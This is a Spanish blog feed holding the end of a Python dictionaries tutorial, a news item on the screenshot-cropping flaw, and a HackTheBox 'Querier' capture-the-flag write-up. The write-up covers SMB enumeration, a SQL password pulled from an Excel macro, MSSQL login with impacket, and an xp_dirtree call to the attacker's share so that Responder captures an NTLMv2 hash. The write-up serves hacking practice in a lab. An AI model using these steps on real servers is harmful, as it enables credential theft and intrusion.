{'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;acceso-a-los-elementos-de-un-diccionario&quot;&gt;Acceso a los elementos de un Diccionario &lt;a href=&quot;#acceso-a-los-elementos-de-un-diccionario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;A diferencia de las tuplas y las listas, en los diccionarios no podemos acceder utilizando un indice. Los valores se acceden utilizando el nombre de las &lt;code&gt;claves&lt;/code&gt; entre &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vemoslo nuevamente en un ejemplo a continuación, para ello usaremos el diccionario que previamente habiamos definido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
    &quot;Nombre&quot;:&quot;firtsmiracle&quot;,
    &quot;Curso&quot;:&quot;Python&quot;,
    &quot;Idioma&quot;:&quot;Español&quot;,
    &quot;Nivel&quot;:&quot;Todos los Niveles&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora supongamos que queremos acceder a la primera clave de mi diccionario. Lo que haria unicamente seria poner entre &lt;code&gt;[]&lt;/code&gt; el nombre de la clave.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario['Nombre']

'firtsmiracle'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo mismo si quisieramos acceder a otra clave.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario['Curso']

'Python'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sim embargo como antes mencionamos, que si queremos hacer lo mismo pero usando un indice, &lt;code&gt;python&lt;/code&gt; nos dara un error, ya que nuevamente debemos recalcar que unicamente podemos acceder usando el nombre de las &lt;code&gt;claves&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario[0]

---------------------------------------------------------------------------
KeyError                                  Traceback (most recent call last)
&amp;lt;ipython-input-10-d5a2f4e83513&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 diccionario[0]

KeyError: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra cosa muy importante a tener en cuenta es que podemos usar cualquier objeto &lt;code&gt;inmutable&lt;/code&gt; como clave de un &lt;code&gt;diccionario&lt;/code&gt;. Estos incluyen a las listas, numeros, tuplas, strings entre otros.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario2 = {
    0: &quot;numero cero&quot;,
    1: &quot;numero uno&quot;,
    2: &quot;numero dos&quot;,
    3: &quot;numero tres&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora queremos acceder a uno de los valores tenemos que hacerlo a traves de su &lt;code&gt;clave&lt;/code&gt;, que en este caso corresponde a un objeto &lt;code&gt;inmutable&lt;/code&gt; que es un numero. Entonces debemos acceder de la siguiente forma:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario2[0]

'numero cero'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo mismo podriamos hacerlo pero esta vez usando un &lt;code&gt;tupla&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario3 = {
    (&quot;numero&quot;, 1): &quot;primer numero&quot;,
    (&quot;numero&quot;, 2): &quot;segundo numero&quot;,
    (&quot;numero&quot;, 3): &quot;tercer numero&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que esta vez como clave usamos una &lt;code&gt;tupla&lt;/code&gt;, y si queremos acceder a uno de los elementos pues debemos hacerlo a traves de la &lt;code&gt;tupla&lt;/code&gt;. Raro pero podemos hacerlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario3[(&quot;numero&quot;, 1)]

'primer numero'
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 30 Mar 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/articulos/Python3</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/Python3</guid>
        
        <category>Python3</category>
        
        <category>programación</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Windows 10 y 11 ya tienen parches para las capturas de pantalla</title>
        <description>&lt;p&gt;Despues que unos investigadores de ciberseguridad habían descubierto un fallo en los móviles Google Pixel y los ordenadores con Windows. Según explicaban, el editor de capturas de pantalla de estos dispositivos mostraba las imágenes completas pese a que los usuarios la recortasen.&lt;/p&gt;

&lt;p&gt;Segun se confirma se debian realizar ciertos pasos para confirmarlo.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw&quot;&gt;https://twitter.com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;Copy an image (to have a backup)&lt;/li&gt;
  &lt;li&gt;Open one with Snipping tool&lt;/li&gt;
  &lt;li&gt;Crop it to make it much smaller&lt;/li&gt;
  &lt;li&gt;Click the Save icon&lt;/li&gt;
  &lt;li&gt;Compare file sizes of cropped and original&lt;/li&gt;
  &lt;li&gt;Wonder about the world that you live in&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;El fallo permitía que aquellos que recibían las capturas recortadas en &lt;code&gt;PNG&lt;/code&gt; pudiesen recuperar parte de la imagen original, dejando visible lo que los usuarios habían querido ocultar. Esto podia ocasinar que se viesen datos sensibles. Ahora, tanto Microsoft como Google, han lanzado unos parches de seguridad para solucionarlo.&lt;/p&gt;

&lt;p&gt;Por lo tanto, los propietarios de dispositivos &lt;code&gt;Pixel&lt;/code&gt; solo tendrán que actualizarlos para evitar recortes de pantalla inservibles. Sin embargo, los de &lt;code&gt;Windows&lt;/code&gt; tendrán que dirigirse a Microsoft Store para hacer lo propio, pero con las plataformas y no con el ordenador.&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/novedades/parche-capturadePantalla-windows</link>
        <guid isPermaLink="true">http://localhost:4000/novedades/parche-capturadePantalla-windows</guid>
        
        <category>windows</category>
        
        <category>parche</category>
        
        <category>seguridad</category>
        
        
        <category>novedades</category>
        
      </item>
    
      <item>
        <title>Maquina Querier - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Querier&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Comenzaremos enumerando los recursos compartidos &lt;code&gt;smb&lt;/code&gt; para obtener la contraseña de un usuario, informando que puede iniciar sesión en el &lt;code&gt;mssql-server&lt;/code&gt;. Para obtener el usuario en el sistema, podemos robar el hash del usuario &lt;code&gt;mssql-svc&lt;/code&gt; ejecutando el comando &lt;code&gt;xp_dirtree&lt;/code&gt; y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script &lt;code&gt;powerup.ps1&lt;/code&gt; de powersploit para obtener las credenciales administrativas alojadas en un archivo &lt;code&gt;xml&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Querier
❯ ls
 Querier
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.125
PING 10.10.10.125 (10.10.10.125) 56(84) bytes of data.
64 bytes from 10.10.10.125: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.125 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.483/137.483/137.483/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.125 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:23 GMT
Initiating SYN Stealth Scan at 14:23
Scanning 10.10.10.125 [65535 ports]
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Completed SYN Stealth Scan at 14:23, 19.31s elapsed (65535 total ports)
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.11s latency).
Scanned at 2023-03-25 14:23:13 GMT for 19s
Not shown: 65090 closed tcp ports (reset), 431 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1433/tcp  open  ms-sql-s     syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
49671/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
           Raw packets sent: 95410 (4.198MB) | Rcvd: 82570 (3.303MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;139 ldap&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; , &lt;code&gt;1433 mssql&lt;/code&gt; y &lt;code&gt;5985 winrm&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:26 GMT
Nmap scan report for 10.10.10.125
Host is up (0.44s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-25T14:21:57
|_Not valid after:  2053-03-25T14:21:57
|_ssl-date: 2023-03-25T14:27:31+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2023-03-25T14:27:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.96 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1433&lt;/td&gt;
      &lt;td&gt;MSSQL-S&lt;/td&gt;
      &lt;td&gt;Microsoft SQL Server 2017 14.00.1000.00; RTM&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usaremos la herramienta crackmapexec:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a buscar si hay recursos compartidos a los que podemos acceder, para ello podemos hacer uso de smbmap con los parametros &lt;code&gt;-H&lt;/code&gt; para especificar el host y &lt;code&gt;-u&lt;/code&gt; para hacer uso de una sesion nula.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null'
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Despues de ver que si podemos listar los recursos compartidos, vemos uno interesante con el nombre de &lt;code&gt;Reports&lt;/code&gt; vamos a ingresar en el para ver su contenido, añadiremos para eso el parametro ‘-r’ y el nombre del recurso:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null' -r Reports
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Reports                                           	READ ONLY	
	.\Reports\*
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	.
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 23:26:31 2019	Currency Volume Report.xlsm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro existe un archivo con la extension &lt;code&gt;xlsm&lt;/code&gt;, asi que vamos a descargarnoslo y renombrar el archivo a un nombre mas comodo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null' --download &quot;Reports\Currency Volume Report.xlsm&quot;
[+] Starting download: Reports\Currency Volume Report.xlsm (12229 bytes)
[+] File output to: /home/fmiracle/Machines/Querier/content/10.10.10.125-Reports_Currency Volume Report.xlsm
❯ ls
 10.10.10.125-Reports_Currency Volume Report.xlsm
❯ mv 10.10.10.125-Reports_Currency\ Volume\ Report.xlsm Report.xlsm
❯ ls
 Report.xlsm
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como es un archivo &lt;code&gt;xlsm&lt;/code&gt; trataremos con el comando &lt;code&gt;strings&lt;/code&gt; lista del archivo algunos caracteres legibles:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ strings Report.xlsm
[Content_Types].xml 
apP&amp;lt;*
Fi+i
d|}5
o=`Fh
O(%$
_rels/.rels 
BKwAH
GJy(v
USh9i
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al no ver informacion interesante, vamos a utilizar un herramienta de github llamada &lt;code&gt;olebva&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/decalage2/oletools/wiki/olevba&quot;&gt;https://github.com/decalage2/oletools/wiki/olevba&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esta herramienta nos permite analizar archivos &lt;code&gt;OLE&lt;/code&gt; y &lt;code&gt;OpenXML&lt;/code&gt;, como documentos de &lt;code&gt;MS Office&lt;/code&gt; para poder detectar macros en texto claro.&lt;/p&gt;

&lt;p&gt;Ejecutamos la herramienta pasandole el archivo &lt;code&gt;xlsm&lt;/code&gt; y esta nos parsea la informacion donde podemos ver un &lt;code&gt;usario&lt;/code&gt; y &lt;code&gt;contraseña&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ olevba Report.xlsm
olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
===============================================================================
FILE: Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox &quot;connection successful&quot;
 
  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a verificar si las credenciales son validas para ello usaremos &lt;code&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tenemos credenciales validas, podemos tratar de conectarnos al servicio &lt;code&gt;mssql&lt;/code&gt; que vimos antes, para ello usaremos la herramienta &lt;code&gt;mssqlclient.py&lt;/code&gt; que viene incluida en la suite de &lt;code&gt;impacket&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/fortra/impacket&quot;&gt;https://github.com/fortra/impacket&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Especificamos tal como nos indica el uso de la herramienta el &lt;code&gt;dominio&lt;/code&gt;, &lt;code&gt;usuario&lt;/code&gt;, &lt;code&gt;contraseña&lt;/code&gt; y adicionamos el parametro &lt;code&gt;-windows-auth&lt;/code&gt; el cual permite utilizar o no la autenticación de Windows &lt;code&gt;(por defecto False)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands SQL&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez conectados al servicio lo que intentaremos hacer es usar &lt;code&gt;xp_cmdshell&lt;/code&gt; para tratar de ejecutar comandos, pero vemos que el usuario &lt;code&gt;reporting&lt;/code&gt; no cuenta con los privilegios suficientes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SQL&amp;gt; xp_cmdshell 'whoami'
[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'whoami'.
SQL&amp;gt; sp_configure 'show_advance', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL&amp;gt; sp_configure 'xp_cmdshell', 1
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL&amp;gt; sp_configure 'show_advance', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL&amp;gt; reconfigure
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Probaremos a tratar de lanzar una conexion con el comando &lt;code&gt;xp_dirtree&lt;/code&gt; para tratar de realizar una conexion a un recurso compartido que alojare en mi maquina y mientras el servidor trata de auntenticarse a mi maquina, con &lt;code&gt;responder&lt;/code&gt; intentare capturar el hash ` Net-NTLMv2`.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL&amp;gt; xp_dirtree &quot;\\10.10.16.4\test&quot;
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   

SQL&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
[+] HTTP Options:
           NBT-NS, LLMNR &amp;amp; MDNS Responder 3.0.6.0
    Serving EXE                [OFF]
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoning Options:
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    Fingerprint hosts          [OFF]
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LBGCELK616Y]
    Responder Domain Name      [68T9.LOCAL]
    Responder DCE-RPC Port     [49780]

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:ba540bb74f74294f
&lt;/code&gt;&lt;/pre&gt;
